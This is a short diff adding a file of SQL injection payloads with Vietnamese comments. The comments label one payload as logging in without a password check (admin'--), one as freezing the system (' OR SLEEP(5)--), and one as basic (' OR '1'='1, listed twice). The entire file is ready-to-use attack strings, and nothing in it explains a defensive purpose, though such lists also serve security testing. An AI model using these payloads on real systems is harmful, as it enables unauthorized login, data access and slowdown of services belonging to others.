@@ -1,0 +1,10 @@
+//Đăng nhập vào mà không cần kiểm tra password
+admin'-- 
+
+
+//Đóng băng hệ thống
+' OR SLEEP(5)-- 
+
+//Basic
+' OR '1'='1
+' OR '1'='1
